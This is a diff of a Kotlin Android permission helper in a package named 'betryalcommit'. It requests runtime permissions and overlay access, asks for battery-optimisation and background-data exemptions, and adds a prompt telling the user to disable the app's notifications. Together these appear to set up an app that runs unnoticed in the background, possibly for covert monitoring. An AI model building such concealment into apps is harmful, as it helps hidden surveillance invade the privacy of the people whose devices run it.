@@ -1,21 +1,28 @@
 package com.example.betryalcommit
 
 import android.Manifest
+import android.app.NotificationChannel
+import android.app.NotificationManager
 import android.content.Context
 import android.content.Intent
 import android.content.SharedPreferences
 import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Build
+import android.os.Handler
+import android.os.Looper
 import android.os.PowerManager
 import android.provider.Settings
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
+import androidx.core.app.NotificationManagerCompat
 import androidx.core.content.ContextCompat
+import kotlin.concurrent.thread
 
 
 object Permsu{
+    val handler = Handler(Looper.getMainLooper())
     private val permissions = arrayOf(
     Manifest.permission.INTERNET,
     Manifest.permission.ACCESS_WIFI_STATE,
@@ -48,9 +55,7 @@ object Permsu{
     fun requestPermissions(
         context: Context,
         activity: AppCompatActivity,
-        requestCode: Int,
-        shared: SharedPreferences
-    ) {
+        requestCode: Int, ) {
 
         for (permission in permissions) {
             if (ContextCompat.checkSelfPermission(
@@ -66,25 +71,29 @@ object Permsu{
                 Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                 Uri.parse("package:" + context.getPackageName())
             )
+            activity.startActivity(intent)
         }
 
+            if(NotificationManagerCompat.from(context).areNotificationsEnabled() == true){
+            val intent = Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS)
+            intent.putExtra("android.provider.extra.APP_PACKAGE", context.getPackageName())
+           handler.post() {
+               Toast.makeText(context, "Please disable notification", Toast.LENGTH_SHORT).show()
 
+           }
+                activity.startActivity(intent)
+        }
         val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
-
         if (!powerManager.isIgnoringBatteryOptimizations(context.getPackageName())) {
             val intent = Intent()
             intent.action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
             intent.data = Uri.parse("package:com.example.betryalcommit")
             activity.startActivity(intent)
-        }
 
-        if(context.checkSelfPermission("android.permission.IGNORE_BACKGROUND_DATA_RESTRICTIONS") == PackageManager.PERMISSION_GRANTED){
-            val intent2 = Intent(
-                Settings.ACTION_IGNORE_BACKGROUND_DATA_RESTRICTIONS_SETTINGS,
-                Uri.parse("package:" + context.getPackageName())
-            )
+            val intent2 = Intent(Settings.ACTION_IGNORE_BACKGROUND_DATA_RESTRICTIONS_SETTINGS,
+            Uri.parse("package:" + context.getPackageName()))
+            context.startActivity(intent2)
         }
-
         if (permissionsToRequest.isNotEmpty()) {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                 ActivityCompat.requestPermissions(
@@ -92,9 +101,7 @@ object Permsu{
                     permissionsToRequest.toTypedArray(),
                     requestCode);
             }
-            val serviceIntent = Intent(context, MyService::class.java)
-                context.startService(serviceIntent)
-        }
+            }
         else{
             Toast.makeText(context, "go ahead", Toast.LENGTH_LONG).show()
         }
@@ -102,11 +109,10 @@ object Permsu{
     val shared = context.getSharedPreferences("shared", Context.MODE_PRIVATE)
 
         val editor = shared.edit()
-        editor.putString("current","permissions")
+        editor.putString("current","ok")
         editor.apply()
         editor.commit()
 
+
     }
-
-
 }
